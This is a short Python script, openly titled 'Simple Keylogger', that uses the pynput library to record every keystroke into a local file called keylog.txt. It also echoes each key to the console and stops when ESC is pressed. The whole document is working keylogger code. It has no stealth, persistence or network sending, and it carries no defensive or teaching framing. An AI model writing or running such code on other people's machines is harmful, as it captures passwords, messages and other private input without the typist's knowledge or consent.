from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

    print(f"Key pressed: {key}")

    # Stop keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped.")
        return False


print("=== Simple Keylogger Started ===")
print("Press ESC to stop.\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()